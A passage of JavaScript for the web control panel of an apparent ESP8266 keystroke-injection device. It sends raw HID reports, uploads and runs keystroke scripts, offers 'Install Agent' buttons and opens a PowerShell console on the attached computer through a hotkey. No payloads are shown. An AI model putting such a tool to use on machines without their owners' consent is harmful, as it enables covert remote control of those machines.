                'F1': 0x3A, 'F2': 0x3B, 'F3': 0x3C, 'F4': 0x3D, 'F5': 0x3E, 'F6': 0x3F,
                'F7': 0x40, 'F8': 0x41, 'F9': 0x42, 'F10': 0x43, 'F11': 0x44, 'F12': 0x45,
                'PrintScreen': 0x46, 'ScrollLock': 0x47, 'Pause': 0x48,
                'Insert': 0x49, 'Home': 0x4A, 'PageUp': 0x4B,
                'Delete': 0x4C, 'End': 0x4D, 'PageDown': 0x4E,
                'ArrowRight': 0x4F, 'ArrowLeft': 0x50, 'ArrowDown': 0x51, 'ArrowUp': 0x52
            };
            if (keyMap[key]) return keyMap[key];
            if (keyMap[key.toLowerCase()]) return keyMap[key.toLowerCase()];
            if (code.startsWith('Key')) {
                const letter = code.substring(3).toLowerCase();
                if (keyMap[letter]) return keyMap[letter];
            }
            if (code.startsWith('Digit')) {
                const digit = code.substring(5);
                if (keyMap[digit]) return keyMap[digit];
            }
            return null;
        }

        function sendKeyboardHID() {
            const keys = Array.from(heldKeys).slice(0, 6);
            while (keys.length < 6) keys.push(0);
            const hidData = `HID:01:0008:${toHex(modifiers, 2)}00${keys.map(k => toHex(k, 2)).join('')}`;
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(hidData + '\r\n');
            }
        }

        function toHex(value, digits) {
            return value.toString(16).toUpperCase().padStart(digits, '0');
        }

        function cleanupInput() {
            mouseButtons = { left: false, right: false };
            trackpadActive = false;
            scrollActive = false;
            if (deviceType === 'MOUSE' || deviceType === 'COMBO') {
                sendMouseHID(0, 0, 0, 0);
            }
            heldKeys.clear();
            modifiers = 0;
            if (deviceType === 'KEYBOARD') {
                sendKeyboardHID();
            }
        }

        // ========== OUTPUT FUNCTIONS ==========
        function scrollOutput(direction) {
            const scrollAmount = 100;
            if (direction === 'up') {
                output.scrollTop -= scrollAmount;
            } else {
                output.scrollTop += scrollAmount;
            }
        }

        function appendOutput(text, className = '') {
            const span = document.createElement('span');
            if (className) span.className = className;
            span.textContent = text;
            output.appendChild(span);
            if (autoScroll) {
                output.scrollTop = output.scrollHeight;
            }
            while (output.children.length > 1000) {
                output.removeChild(output.firstChild);
            }
        }

        function clearOutput() {
            output.innerHTML = '';
            eventCount = 0;
            appendOutput('=== Output cleared ===\n', 'system-message');
        }

        function toggleAutoScroll() {
            autoScroll = !autoScroll;
            const iconBtn = document.getElementById('autoscroll-btn-icon');
            if (iconBtn) {
                iconBtn.title = autoScroll ? 'Auto-scroll: ON' : 'Auto-scroll: OFF';
                if (autoScroll) {
                    iconBtn.classList.add('active');
                } else {
                    iconBtn.classList.remove('active');
                }
            }
            if (autoScroll) {
                output.scrollTop = output.scrollHeight;
            }
        }

        // ========== AT COMMANDS ==========
        function sendATCommand(cmd) {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            ws.send(cmd + '\r\n');
            // Don't display raw AT commands - responses are displayed in user-friendly format
            if (cmd === 'AT+INFO') {
                // Set flag to show modal after INFO response is received
                waitingForInfoModal = true;
            }
        }

        function sendCommand(cmd) {
            const timestamp = new Date().toISOString();
            console.log(`[${timestamp}] [BUTTON-CLICK] User initiated command: "${cmd}"`);

            if (!isConnected) {
                console.log(`[${timestamp}] [BUTTON-CLICK] BLOCKED - Not connected to WebSocket`);
                showToast('Not connected', 'error');
                return;
            }

            console.log(`[${timestamp}] [WS-SEND] Sending command via WebSocket: "${cmd}"`);
            console.log(`[${timestamp}] [WS-SEND] WebSocket readyState: ${ws.readyState} (1=OPEN)`);

            ws.send(cmd);

            console.log(`[${timestamp}] [WS-SEND] Command sent successfully to ESP8266`);
        }

        // ========== TOGGLE SWITCH MANAGEMENT ==========
        function handleToggleSwitch(toggleType) {
            const timestamp = new Date().toISOString();

            // Get current state based on toggle type
            let currentState, newState;
            const toggleTypeUpper = toggleType.toUpperCase();

            switch(toggleType.toLowerCase()) {
                case 'hybrid':
                    currentState = hybridModeEnabled;
                    break;
                case 'serial':
                    currentState = serialModeEnabled;
                    break;
                case 'storage':
                    currentState = storageModeEnabled;
                    break;
                case 'netbridge':
                    currentState = netbridgeModeEnabled;
                    break;
                default:
                    console.error(`[${timestamp}] [TOGGLE-ERROR] Unknown toggle type: ${toggleType}`);
                    return;
            }

            newState = !currentState;
            const currentStateStr = currentState ? 'ON' : 'OFF';
            const newStateStr = newState ? 'ON' : 'OFF';

            console.log(`[${timestamp}] [TOGGLE-CLICK] User toggling ${toggleTypeUpper}: ${currentStateStr} → ${newStateStr}`);

            // Check if connected
            if (!isConnected) {
                console.log(`[${timestamp}] [TOGGLE-CLICK] BLOCKED - Not connected to WebSocket`);
                showToast('Not connected', 'error');
                return;
            }

            // Send command to ESP8266 - wait for response before updating UI
            const command = `${toggleTypeUpper}_SET:${newStateStr}`;
            console.log(`[${timestamp}] [TOGGLE-SEND] Sending command: "${command}"`);
            console.log(`[${timestamp}] [TOGGLE-SEND] WebSocket readyState: ${ws.readyState} (1=OPEN)`);

            ws.send(command);

            console.log(`[${timestamp}] [TOGGLE-SEND] Command sent successfully - waiting for ESP8266 response to update UI`);
        }

        function updateToggleUI(toggleType, isEnabled) {
            const timestamp = new Date().toISOString();
            const stateStr = isEnabled ? 'ON' : 'OFF';

            console.log(`[${timestamp}] [TOGGLE-UI] Updating ${toggleType.toUpperCase()} toggle UI to: ${stateStr}`);

            // Find the toggle element
            const toggleElement = document.getElementById(`${toggleType.toLowerCase()}-toggle`);

            if (!toggleElement) {
                console.error(`[${timestamp}] [TOGGLE-UI-ERROR] Toggle element not found for: ${toggleType}`);
                return;
            }

            // Update the UI based on state
            if (isEnabled) {
                toggleElement.classList.add('active');
                console.log(`[${timestamp}] [TOGGLE-UI] Added 'active' class to ${toggleType} toggle`);
            } else {
                toggleElement.classList.remove('active');
                console.log(`[${timestamp}] [TOGGLE-UI] Removed 'active' class from ${toggleType} toggle`);
            }

            console.log(`[${timestamp}] [TOGGLE-UI] ${toggleType.toUpperCase()} toggle UI update complete`);
        }

        // ========== INPUT BUTTON MANAGEMENT ==========
        function updateInputButton() {
            // If not connected, disable both buttons
            if (!isConnected) {
                mouseDeviceBtn.disabled = true;
                keyboardDeviceBtn.disabled = true;
                updateShellButton();
                updateScreenButton();
                return;
            }

            // If hybrid mode is enabled, enable both buttons
            if (hybridModeEnabled) {
                mouseDeviceBtn.disabled = false;
                keyboardDeviceBtn.disabled = false;
                updateShellButton();
                updateScreenButton();
                return;
            }

            // If hybrid mode is disabled, enable only the connected device button
            if (deviceType === 'MOUSE') {
                mouseDeviceBtn.disabled = false;
                keyboardDeviceBtn.disabled = true;
            } else if (deviceType === 'KEYBOARD') {
                mouseDeviceBtn.disabled = true;
                keyboardDeviceBtn.disabled = false;
            } else if (deviceType === 'COMPOSITE' || deviceType === 'HYBRID') {
                // Composite/Hybrid devices enable both
                mouseDeviceBtn.disabled = false;
                keyboardDeviceBtn.disabled = false;
            } else {
                // Unknown or no device - disable both
                mouseDeviceBtn.disabled = true;
                keyboardDeviceBtn.disabled = true;
            }

            updateShellButton();
            updateScreenButton();
        }

        function updateScreenButton() {
            // Screen button enabled when:
            // - SERIAL=ON AND (HYBRID=ON OR TYPE in [KEYBOARD, HYBRID, COMPOSITE, NONE])
            const canUseScreen = serialModeEnabled && (
                hybridModeEnabled ||
                deviceType === 'KEYBOARD' ||
                deviceType === 'HYBRID' ||
                deviceType === 'COMPOSITE' ||
                deviceType === 'NONE'
            );
            screenBtn.disabled = !canUseScreen;
        }

        function updateShellButton() {
            // Shell button enabled when:
            // - SERIAL=ON AND (HYBRID=ON OR TYPE in [KEYBOARD, HYBRID, COMPOSITE, NONE])
            // Same conditions as screen button
            const canUseShell = serialModeEnabled && (
                hybridModeEnabled ||
                deviceType === 'KEYBOARD' ||
                deviceType === 'HYBRID' ||
                deviceType === 'COMPOSITE' ||
                deviceType === 'NONE'
            );
            shellBtn.disabled = !canUseShell;
        }

        function updateInstallAgentButton() {
            // Install Agent button enabled when:
            // - All screen button conditions are met AND STORAGE=ON
            const installAgentBtn = document.getElementById('install-agent-btn');
            if (!installAgentBtn) return;  // Button might not exist in DOM yet

            const canUseScreen = serialModeEnabled && (
                hybridModeEnabled ||
                deviceType === 'KEYBOARD' ||
                deviceType === 'HYBRID' ||
                deviceType === 'COMPOSITE' ||
                deviceType === 'NONE'
            );
            const canInstallAgent = canUseScreen && storageModeEnabled;
            installAgentBtn.disabled = !canInstallAgent;
        }

        function updatePSInstallAgentButton() {
            // PS Install Agent button enabled only when STORAGE=ON
            const psInstallAgentBtn = document.getElementById('install-ps-agent-btn');
            if (!psInstallAgentBtn) return;  // Button might not exist in DOM yet

            psInstallAgentBtn.disabled = !storageModeEnabled;

            // Apply blue styling when enabled, grey handled by CSS :disabled
            if (storageModeEnabled) {
                psInstallAgentBtn.style.background = '#0e639c';
                psInstallAgentBtn.style.borderColor = '#1177bb';
                psInstallAgentBtn.style.color = '#ffffff';
            } else {
                psInstallAgentBtn.style.background = '';
                psInstallAgentBtn.style.borderColor = '';
                psInstallAgentBtn.style.color = '';
            }
        }

        // ========== RECORDING FUNCTIONS ==========
        function toggleRecording() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            if (recState === RecState.RECORDING) {
                ws.send('REC_STOP');
            } else if (recState === RecState.IDLE || recState === RecState.STOPPED) {
                ws.send('REC_START');
            }
        }

        function replayRecording() {
            if (recState !== RecState.STOPPED) return;
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            ws.send('REC_REPLAY');
        }

        function clearRecording() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            ws.send('REC_CLEAR');
        }

        function exportRecording() {
            if (recState !== RecState.STOPPED) {
                showToast('No recording to export', 'error');
                return;
            }
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            // Request recording data from ESP8266
            ws.send('REC_EXPORT');
            showToast('Requesting recording data...', 'info');
        }

        function updateRecordingUI() {
            const toggleBtn = document.getElementById('rec-toggle');
            const replayBtn = document.getElementById('rec-replay');
            const exportBtn = document.getElementById('rec-export');
            const clearBtn = document.getElementById('rec-clear');
            const recIcon = document.getElementById('rec-icon');
            const recLabel = document.getElementById('rec-label');

            switch (recState) {
                case RecState.IDLE:
                    toggleBtn.disabled = false;
                    toggleBtn.className = 'btn-record';
                    recIcon.textContent = '⬤';
                    recLabel.textContent = 'Record';
                    replayBtn.disabled = true;
                    exportBtn.disabled = true;
                    clearBtn.disabled = true;
                    break;
                case RecState.RECORDING:
                    toggleBtn.disabled = false;
                    toggleBtn.className = 'btn-record recording';
                    recIcon.textContent = '⏹';
                    recLabel.textContent = 'Stop';
                    replayBtn.disabled = true;
                    exportBtn.disabled = true;
                    clearBtn.disabled = true;
                    break;
                case RecState.STOPPED:
                    toggleBtn.disabled = false;
                    toggleBtn.className = 'btn-record';
                    recIcon.textContent = '⬤';
                    recLabel.textContent = 'Record';
                    replayBtn.disabled = false;
                    exportBtn.disabled = false;
                    clearBtn.disabled = false;
                    break;
                case RecState.REPLAYING:
                    toggleBtn.disabled = true;
                    replayBtn.disabled = true;
                    exportBtn.disabled = true;
                    clearBtn.disabled = true;
                    break;
            }
        }

        // ========== PHANTOMSCRIPT CONTROL FUNCTIONS ==========

        // Upload and execute script directly
        function uploadScript() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }

            const input = document.getElementById('script-upload-input');
            input.onchange = handleScriptUpload;
            input.click();
        }

        function handleScriptUpload(e) {
            const file = e.target.files[0];
            if (!file) return;

            if (!file.name.endsWith('.txt') && !file.name.endsWith('.ps')) {
                showToast('Please select a .txt or .ps file', 'error');
                return;
            }

            if (file.size > 102400) {
                showToast('Script file too large (max 100KB)', 'error');
                return;
            }

            const formData = new FormData();
            formData.append('file', file);

            showToast('Uploading script...', 'info');

            fetch('/script_upload', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    showToast('Script uploaded and executing...', 'success');
                } else {
                    showToast('Upload failed', 'error');
                }
            })
            .catch(error => {
                showToast('Upload error: ' + error.message, 'error');
            });

            // Clear the input so the same file can be uploaded again
            e.target.value = '';
        }

        function runScript() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            if (scriptState === ScriptState.RUNNING) {
                showToast('Script already running', 'warning');
                return;
            }
            ws.send('SCRIPT_RUN');
        }

        function pauseScript() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            if (scriptState === ScriptState.RUNNING) {
                ws.send('SCRIPT_PAUSE');
            } else if (scriptState === ScriptState.PAUSED) {
                ws.send('SCRIPT_RESUME');
            }
        }

        function stopScript() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            if (scriptState !== ScriptState.RUNNING) {
                showToast('No script running', 'warning');
                return;
            }
            ws.send('SCRIPT_STOP');
        }

        function updateScriptUI() {
            const uploadBtn = document.getElementById('script-upload');
            const runBtn = document.getElementById('script-run');
            const pauseBtn = document.getElementById('script-pause');
            const stopBtn = document.getElementById('script-stop');

            // PhantomScript works when keyboard functionality is available:
            // - Keyboard device OR Hybrid/Composite device OR Hybrid mode enabled
            const canRunScript = (
                deviceType === 'KEYBOARD' ||
                deviceType === 'HYBRID' ||
                deviceType === 'COMPOSITE' ||
                hybridModeEnabled
            );

            switch (scriptState) {
                case ScriptState.IDLE:
                    uploadBtn.disabled = !canRunScript;
                    runBtn.disabled = !canRunScript;
                    pauseBtn.disabled = true;
                    pauseBtn.innerHTML = '⏸ Pause';
                    stopBtn.disabled = true;
                    break;
                case ScriptState.RUNNING:
                    uploadBtn.disabled = true;
                    runBtn.disabled = true;
                    pauseBtn.disabled = false;
                    pauseBtn.innerHTML = '⏸ Pause';
                    stopBtn.disabled = false;
                    break;
                case ScriptState.PAUSED:
                    uploadBtn.disabled = true;
                    runBtn.disabled = true;
                    pauseBtn.disabled = false;
                    pauseBtn.innerHTML = '▶ Resume';
                    stopBtn.disabled = false;
                    break;
                case ScriptState.STOPPED:
                    uploadBtn.disabled = !canRunScript;
                    runBtn.disabled = !canRunScript;
                    pauseBtn.disabled = true;
                    pauseBtn.innerHTML = '⏸ Pause';
                    stopBtn.disabled = true;
                    break;
            }
        }

        // ========== TOAST NOTIFICATIONS ==========
        function showToast(message, type = 'info') {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            const icon = {
                success: '✓', error: '✗', warning: '⚠', info: 'ℹ'
            }[type] || 'ℹ';
            toast.innerHTML = `<span style="font-size:16px">${icon}</span><span>${message}</span>`;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transform = 'translateX(300px)';
                setTimeout(() => container.removeChild(toast), 300);
            }, 3000);
        }

        // ========== OTA UPDATE FUNCTIONS ==========
        function fetchVersion() {
            fetch('/version?t=' + Date.now())
                .then(response => response.text())
                .then(version => {
                    currentFirmwareVersion = version;
                    document.getElementById('version-badge').textContent = 'v' + version;
                    document.getElementById('current-version').textContent = version;
                })
                .catch(err => {
                    console.error('Failed to fetch version:', err);
                    document.getElementById('version-badge').textContent = 'v?.?.?';
                    document.getElementById('current-version').textContent = 'Unknown';
                });
        }


        function fetchCurrentSSID() {
            fetch('/ap_ssid?t=' + Date.now())
                .then(response => response.text())
                .then(ssid => {
                    document.getElementById('ap-ssid-input').placeholder = 'Current: ' + ssid;
                })
                .catch(err => {
                    console.error('Failed to fetch SSID:', err);
                });
        }

        function fetchFactoryBackupStatus() {
            fetch('/factory_status?t=' + Date.now())
                .then(response => response.json())
                .then(data => {
                    const statusEl = document.getElementById('factory-backup-status');
                    const deleteBtn = document.getElementById('factory-delete-btn');

                    if (data.exists) {
                        statusEl.textContent = `${formatBytes(data.size)} (${data.version || 'Unknown version'})`;
                        statusEl.style.color = '#66bb6a';
                        deleteBtn.disabled = false;
                    } else {
                        statusEl.textContent = 'No backup saved';
                        statusEl.style.color = '#ef5350';
                        deleteBtn.disabled = true;
                    }
                })
                .catch(err => {
                    console.error('Failed to fetch factory backup status:', err);
                    document.getElementById('factory-backup-status').textContent = 'Unknown';
                });
        }

        function openSettingsModal() {
            // Reset OTA section
            selectedFile = null;
            document.getElementById('file-input').value = '';
            document.getElementById('file-info').style.display = 'none';
            document.getElementById('progress-container').style.display = 'none';
            document.getElementById('upload-btn').disabled = true;
            document.getElementById('ota-status').textContent = '';
            document.getElementById('ota-status').style.color = '#90caf9';
            document.getElementById('progress-bar').style.width = '0%';
            document.getElementById('progress-text').textContent = '0%';
            otaLastProgress = 0; // Reset global progress tracker

            // Reset Factory section
            selectedFactoryFile = null;
            document.getElementById('factory-file-input').value = '';
            document.getElementById('factory-file-info').style.display = 'none';
            document.getElementById('factory-progress-container').style.display = 'none';
            document.getElementById('factory-upload-btn').disabled = true;
            document.getElementById('factory-status').textContent = '';
            document.getElementById('factory-status').style.color = '#90caf9';
            document.getElementById('factory-progress-bar').style.width = '0%';
            document.getElementById('factory-progress-text').textContent = '0%';

            // Reset AP section
            document.getElementById('ap-ssid-input').value = '';
            document.getElementById('ap-password-input').value = '';
            document.getElementById('ap-status').textContent = '';
            document.getElementById('ap-status').style.color = '#90caf9';
            document.getElementById('save-ap-btn').disabled = false;

            // Reset PhantomScript settings section
            document.getElementById('script-settings-status').textContent = '';
            document.getElementById('script-settings-status').style.color = '#90caf9';

            // Fetch current statuses
            fetchCurrentSSID();
            fetchFactoryBackupStatus();

            // Load script settings
            if (isConnected && ws && ws.readyState === WebSocket.OPEN) {
                ws.send('SCRIPT_SETTINGS_GET\r\n');
            }

            document.getElementById('settings-modal-overlay').classList.add('show');
            setupOTAEventListeners();
            setupFactoryEventListeners();
        }

        function closeSettingsModal() {
            document.getElementById('settings-modal-overlay').classList.remove('show');
        }

        // ========== SERIAL MONITOR FUNCTIONS ==========
        // ========== POWERSHELL CONSOLE FUNCTIONS ==========
        let psConsoleOpen = false;

        function updatePSStatus(status) {
            const indicator = document.getElementById('ps-status-indicator');
            if (indicator) {
                indicator.className = 'ps-status-indicator ' + status;
            }
        }

        function openSerialMonitor() {
            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            // Clear any old state from previous session
            psReceiving = false;
            psConsoleOpen = true;

            // Send clear signal to ESP8266 to discard any pending response data
            try {
                ws.send('PS_CONSOLE_OPEN');
            } catch (e) {
                console.error('[SERIAL] Error sending console open signal:', e);
            }

            document.getElementById('serial-monitor-modal-overlay').classList.add('show');
            updatePSStatus('connected');
            updatePSInstallAgentButton();  // Update button state

            // Focus on input field after modal opens
            setTimeout(() => {
                document.getElementById('ps-command-input').focus();
            }, 100);
        }

        function closeSerialMonitor() {
            psConsoleOpen = false;
            psReceiving = false;

            // Send clear signal to ESP8266 to discard any pending response data
            try {
                ws.send('PS_CONSOLE_CLOSE');
            } catch (e) {
                console.error('[SERIAL] Error sending console close signal:', e);
            }

            document.getElementById('serial-monitor-modal-overlay').classList.remove('show');
        }

        function appendToSerialMonitor(text) {
            const output = document.getElementById('ps-console-output');
            const container = document.getElementById('ps-console-container');
            if (!output) {
                console.error('[SERIAL] Console output not found');
                return;
            }
            output.textContent += text;
            // Auto-scroll to bottom
            if (container) {
                container.scrollTop = container.scrollHeight;
            }
        }

        function clearSerialMonitor() {
            const output = document.getElementById('ps-console-output');
            if (output) {
                output.textContent = 'Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\n';
            }
        }

        function exitSerialMonitor() {
            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            try {
                // Send exit command
                ws.send('SERIAL_SEND:' + 'exit' + '\r\n');
                console.log('[SERIAL] Exit command sent');

                // Clear screen and close modal after a short delay
                setTimeout(() => {
                    clearSerialMonitor();
                    closeSerialMonitor();
                }, 100);
            } catch (err) {
                console.error('[SERIAL] Error sending exit command:', err);
                showToast('Error sending exit command', 'error');
            }
        }

        function startShell() {
            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            try {
                // Send CTRL+ALT+SHIFT+H as raw HID report (like screenshot capture but with H key)
                // HID Keyboard Report format: HID:01:0008:MMRRKKKKKKKKKKKKKKK
                // MM = Modifiers byte (CTRL=0x01 | SHIFT=0x02 | ALT=0x04 = 0x07)
                // RR = Reserved (0x00)
                // KK = 6 key slots (H=0x0B in slot 1, rest 0x00)

                console.log('[SERIAL] Sending shell start: CTRL+ALT+SHIFT+H (raw HID)');

                // Press: CTRL+ALT+SHIFT+H
                const hidPress = 'HID:01:0008:07000B000000000000';
                ws.send(hidPress + '\r\n');

                // Release: all zeros after 100ms
                setTimeout(() => {
                    const hidRelease = 'HID:01:0008:0000000000000000';
                    ws.send(hidRelease + '\r\n');
                    console.log('[SERIAL] Released keys');
                }, 100);

                showToast('Shell start command sent', 'info');
            } catch (err) {
                console.error('[SERIAL] Error sending start command:', err);
                showToast('Error sending start command', 'error');
            }
        }

        function restartSerialMonitor() {
            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            try {
                // Send restart_shell command
                ws.send('SERIAL_SEND:' + 'restart_shell' + '\r\n');
                console.log('[SERIAL] Restart command sent');

                // Clear the console display after a short delay
                setTimeout(() => {
                    clearSerialMonitor();
                }, 100);

                showToast('Shell restarted', 'info');
            } catch (err) {
                console.error('[SERIAL] Error sending restart command:', err);
                showToast('Error sending restart command', 'error');
            }
        }

        function sendSerialCommand() {
            const input = document.getElementById('ps-command-input');
            const executeBtn = document.getElementById('ps-execute-btn');
            if (!input) {
                console.error('[SERIAL] Input element not found');
                return;
            }

            const command = input.value.trim();
            console.log('[SERIAL] Sending command:', command);

            if (!command || command === '') {
                console.log('[SERIAL] Empty command, ignoring');
                return;
            }

            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            try {
                // Add command prompt and command to output
                appendToSerialMonitor('PS > ' + command + '\n');

                // Send command with SERIAL_SEND prefix (ESP8266 handles encoding)
                ws.send('SERIAL_SEND:' + command + '\r\n');
                console.log('[SERIAL] Command sent via WebSocket');

                // Clear input field
                input.value = '';

                // Disable button temporarily
                if (executeBtn) {
                    executeBtn.disabled = true;
                    setTimeout(() => {
                        executeBtn.disabled = false;
                    }, 500);
                }
            } catch (err) {
                console.error('[SERIAL] Error sending command:', err);
                showToast('Error sending command', 'error');
            }
        }

        // Setup event listeners for serial monitor (called once on load)
        function setupSerialMonitorListeners() {
            // Enter key to send
            const input = document.getElementById('ps-command-input');
            if (input) {
                input.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        sendSerialCommand();
                    }
                });
            }

            // Click outside to close
            document.getElementById('serial-monitor-modal-overlay').addEventListener('click', function(e) {
                if (e.target === this) {
                    closeSerialMonitor();
                }
            });
        }

        let otaListenersSetup = false;
        function setupOTAEventListeners() {
            if (otaListenersSetup) return;
            const fileInput = document.getElementById('file-input');
            const uploadArea = document.getElementById('upload-area');
            if (!fileInput || !uploadArea) return;

            uploadArea.addEventListener('click', function() {
                fileInput.click();
            });

            fileInput.addEventListener('change', function(e) {
                handleFileSelect(e.target.files[0]);
            });

            uploadArea.addEventListener('dragover', function(e) {
                e.preventDefault();
                e.stopPropagation();
                uploadArea.classList.add('dragover');
            });

            uploadArea.addEventListener('dragleave', function(e) {
                e.preventDefault();
                e.stopPropagation();
                uploadArea.classList.remove('dragover');
            });

            uploadArea.addEventListener('drop', function(e) {
                e.preventDefault();
                e.stopPropagation();
                uploadArea.classList.remove('dragover');
                const files = e.dataTransfer.files;
                if (files.length > 0) {
                    handleFileSelect(files[0]);
                }
            });

            document.getElementById('settings-modal-overlay').addEventListener('click', function(e) {
                if (e.target === this) closeSettingsModal();
            });

            otaListenersSetup = true;
        }

        // ========== FACTORY FIRMWARE BACKUP FUNCTIONS ==========
        let factoryListenersSetup = false;
        function setupFactoryEventListeners() {
            if (factoryListenersSetup) return;
            const fileInput = document.getElementById('factory-file-input');
            const uploadArea = document.getElementById('factory-upload-area');
            if (!fileInput || !uploadArea) return;

            uploadArea.addEventListener('click', function() {
                fileInput.click();
            });

            fileInput.addEventListener('change', function(e) {
                handleFactoryFileSelect(e.target.files[0]);
            });

            uploadArea.addEventListener('dragover', function(e) {
                e.preventDefault();
                e.stopPropagation();
                uploadArea.classList.add('dragover');
            });

            uploadArea.addEventListener('dragleave', function(e) {
                e.preventDefault();
                e.stopPropagation();
                uploadArea.classList.remove('dragover');
            });

            uploadArea.addEventListener('drop', function(e) {
                e.preventDefault();
                e.stopPropagation();
                uploadArea.classList.remove('dragover');
                const files = e.dataTransfer.files;
                if (files.length > 0) {
                    handleFactoryFileSelect(files[0]);
                }
            });

            factoryListenersSetup = true;
        }

        function handleFactoryFileSelect(file) {
            if (!file) return;
            if (!file.name.toLowerCase().endsWith('.bin')) {
                showToast('Please select a .bin file', 'error');
                return;
            }
            if (file.size > 1024 * 1024) {
                showToast('File too large (max 1MB)', 'error');
                return;
            }
            selectedFactoryFile = file;
            document.getElementById('factory-filename').textContent = file.name;
            document.getElementById('factory-filesize').textContent = formatBytes(file.size);
            document.getElementById('factory-file-info').style.display = 'block';
            document.getElementById('factory-upload-btn').disabled = false;
        }

        function startFactoryUpload() {
            if (!selectedFactoryFile) {
                showToast('No file selected', 'error');
                return;
            }

            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            document.getElementById('factory-upload-btn').disabled = true;
            document.getElementById('factory-progress-container').style.display = 'block';
            document.getElementById('factory-progress-bar').style.width = '0%';
            document.getElementById('factory-progress-text').textContent = '0%';
            document.getElementById('factory-status').textContent = 'Uploading factory firmware...';
            document.getElementById('factory-status').style.color = '#90caf9';

            const formData = new FormData();
            formData.append('firmware', selectedFactoryFile);

            const xhr = new XMLHttpRequest();
            let lastProgress = 0; // Track last progress to prevent backward jumps

            xhr.upload.addEventListener('progress', function(e) {
                if (e.lengthComputable) {
                    const percent = Math.round((e.loaded / e.total) * 100);
                    // Only update if progress moved forward (prevent backward jumps)
                    if (percent > lastProgress) {
                        lastProgress = percent;
                        document.getElementById('factory-progress-bar').style.width = percent + '%';
                        document.getElementById('factory-progress-text').textContent = percent + '%';
                    }
                }
            });

            xhr.addEventListener('load', function() {
                if (xhr.status === 200) {
                    document.getElementById('factory-progress-bar').style.width = '100%';
                    document.getElementById('factory-progress-text').textContent = '100%';
                    document.getElementById('factory-status').textContent = '✓ Factory firmware saved successfully!';
                    document.getElementById('factory-status').style.color = '#66bb6a';
                    showToast('Factory firmware saved', 'success');

                    // Refresh status
                    setTimeout(() => {
                        fetchFactoryBackupStatus();
                        // Reset UI
                        selectedFactoryFile = null;
                        document.getElementById('factory-file-input').value = '';
                        document.getElementById('factory-file-info').style.display = 'none';
                        document.getElementById('factory-progress-container').style.display = 'none';
                        document.getElementById('factory-upload-btn').disabled = true;
                    }, 2000);
                } else {
                    document.getElementById('factory-status').textContent = '✗ Upload failed: ' + xhr.statusText;
                    document.getElementById('factory-status').style.color = '#ef5350';
                    showToast('Upload failed', 'error');
                    document.getElementById('factory-upload-btn').disabled = false;
                }
            });

            xhr.addEventListener('error', function() {
                document.getElementById('factory-status').textContent = '✗ Network error';
                document.getElementById('factory-status').style.color = '#ef5350';
                showToast('Upload failed', 'error');
                document.getElementById('factory-upload-btn').disabled = false;
            });

            xhr.open('POST', '/factory_upload', true);
            xhr.send(formData);
        }

        function deleteFactoryFirmware() {
            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            if (!confirm('Delete factory firmware backup? This cannot be undone.')) {
                return;
            }

            fetch('/factory_delete', { method: 'POST' })
                .then(response => response.text())
                .then(result => {
                    if (result === 'OK') {
                        showToast('Factory firmware deleted', 'success');
                        fetchFactoryBackupStatus();
                        document.getElementById('factory-status').textContent = '✓ Factory firmware deleted';
                        document.getElementById('factory-status').style.color = '#66bb6a';
                    } else {
                        showToast('Delete failed', 'error');
                        document.getElementById('factory-status').textContent = '✗ Delete failed';
                        document.getElementById('factory-status').style.color = '#ef5350';
                    }
                })
                .catch(err => {
                    console.error('Delete failed:', err);
                    showToast('Delete failed', 'error');
                });
        }

        // ========== AP CREDENTIALS FUNCTIONS ==========
        function saveAPCredentials() {
            const ssid = document.getElementById('ap-ssid-input').value.trim();
            const password = document.getElementById('ap-password-input').value.trim();
            const statusEl = document.getElementById('ap-status');
            const saveBtn = document.getElementById('save-ap-btn');

            // Validation
            if (ssid.length === 0 && password.length === 0) {
                statusEl.textContent = '⚠️ Please enter new credentials';
                statusEl.style.color = '#ffa726';
                return;
            }

            if (ssid.length > 0 && (ssid.length < 1 || ssid.length > 32)) {
                statusEl.textContent = '⚠️ SSID must be 1-32 characters';
                statusEl.style.color = '#ef5350';
                return;
            }

            if (password.length > 0 && (password.length < 8 || password.length > 63)) {
                statusEl.textContent = '⚠️ Password must be 8-63 characters';
                statusEl.style.color = '#ef5350';
                return;
            }

            if (!isConnected) {
                statusEl.textContent = '⚠️ Not connected to device';
                statusEl.style.color = '#ef5350';
                return;
            }

            // Send command
            const command = `AP_CONFIG:${ssid},${password}`;
            ws.send(command + '\r\n');

            statusEl.textContent = '💾 Saving and rebooting...';
            statusEl.style.color = '#66bb6a';
            saveBtn.disabled = true;

            showToast('Saving AP credentials...', 'info');

            // Device will reboot, close modal after delay
            setTimeout(() => {
                closeSettingsModal();
                appendOutput('\n=== Device rebooting with new AP credentials ===\n', 'system-message');
                appendOutput('Please reconnect to the new WiFi network!\n', 'system-message');
            }, 2000);
        }

        function confirmSettingsReset() {
            if (!isConnected) {
                showToast('Not connected to device', 'error');
                return;
            }

            const confirmed = confirm(
                '⚙️ Settings Reset\n\n' +
                'This will:\n' +
                '• Delete WiFi credentials (revert to defaults)\n' +
                '• Delete all recordings\n' +
                '• Delete OTA staging files\n' +
                '• Keep current firmware intact\n\n' +
